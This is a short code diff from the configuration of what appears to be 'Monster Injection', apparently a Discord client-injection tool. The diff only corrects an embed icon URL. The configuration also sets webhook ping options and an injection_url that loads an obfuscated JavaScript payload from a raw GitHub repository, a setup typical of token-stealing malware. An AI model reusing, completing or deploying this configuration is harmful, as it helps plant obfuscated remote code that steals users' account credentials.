@@ -12,7 +12,7 @@ const config = {
   ping_on_run: false, 
   ping_val: '@everyone', 
   embed_name: 'Monster Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/monsterservices/monster-injection/monster-injection/imgs/pfp.png', 
+  embed_icon: 'https://raw.githubusercontent.com/monsterservices/monster-injection/main/monster-injection/imgs/pfp.png', 
   embed_color: 0, 
   injection_url: 'https://raw.githubusercontent.com/monsterservices/monster-injection/main/monster-injection/obfuscated.js', 
 
